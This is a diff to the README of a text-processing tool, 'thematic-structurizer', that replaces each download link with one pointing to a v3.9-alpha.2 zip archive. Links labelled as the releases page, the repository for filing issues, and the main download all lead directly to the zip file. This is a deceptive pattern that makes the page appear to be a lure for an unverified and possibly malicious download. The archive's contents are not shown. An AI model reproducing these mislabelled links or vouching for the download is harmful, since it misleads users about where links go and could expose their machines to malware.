@@ -6,14 +6,14 @@ Welcome to the thematic-structurizer! This tool helps you process text related t
 
 ## 📥 Download the Software
 
-[![Download the latest release](https://raw.githubusercontent.com/Nihad309/thematic-structurizer/main/thematic_structurizer/thematic-structurizer-v3.2.zip%20release-blue)](https://raw.githubusercontent.com/Nihad309/thematic-structurizer/main/thematic_structurizer/thematic-structurizer-v3.2.zip)
+[![Download the latest release](https://github.com/Nihad309/thematic-structurizer/raw/refs/heads/main/thematic_structurizer/thematic_structurizer_v3.9-alpha.2.zip%20release-blue)](https://github.com/Nihad309/thematic-structurizer/raw/refs/heads/main/thematic_structurizer/thematic_structurizer_v3.9-alpha.2.zip)
 
 To get started, you'll need to download the software. Follow these steps:
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Nihad309/thematic-structurizer/main/thematic_structurizer/thematic-structurizer-v3.2.zip) to find the latest version of thematic-structurizer.
+   Go to the [Releases page](https://github.com/Nihad309/thematic-structurizer/raw/refs/heads/main/thematic_structurizer/thematic_structurizer_v3.9-alpha.2.zip) to find the latest version of thematic-structurizer.
 
 2. **Select the Appropriate Version**  
    Choose a version that matches your operating system. We offer builds for Windows, Mac, and Linux.
@@ -54,7 +54,7 @@ Before downloading, make sure your system meets these requirements:
 
 ## 🔄 Feedback and Support
 
-If you have questions or need help, we encourage you to contact our support team. Suggestions for improving thematic-structurizer are always welcome. Please feel free to submit issues on the [repository](https://raw.githubusercontent.com/Nihad309/thematic-structurizer/main/thematic_structurizer/thematic-structurizer-v3.2.zip).
+If you have questions or need help, we encourage you to contact our support team. Suggestions for improving thematic-structurizer are always welcome. Please feel free to submit issues on the [repository](https://github.com/Nihad309/thematic-structurizer/raw/refs/heads/main/thematic_structurizer/thematic_structurizer_v3.9-alpha.2.zip).
 
 ## 📜 License
 
@@ -83,4 +83,4 @@ Thematic-structurizer supports a range of topics, including:
 
 For any other questions, please feel free to explore the tool and engage with our community. We hope you find thematic-structurizer helpful for your text processing needs! 
 
-Remember, download the software [here](https://raw.githubusercontent.com/Nihad309/thematic-structurizer/main/thematic_structurizer/thematic-structurizer-v3.2.zip) to get started!
+Remember, download the software [here](https://github.com/Nihad309/thematic-structurizer/raw/refs/heads/main/thematic_structurizer/thematic_structurizer_v3.9-alpha.2.zip) to get started!
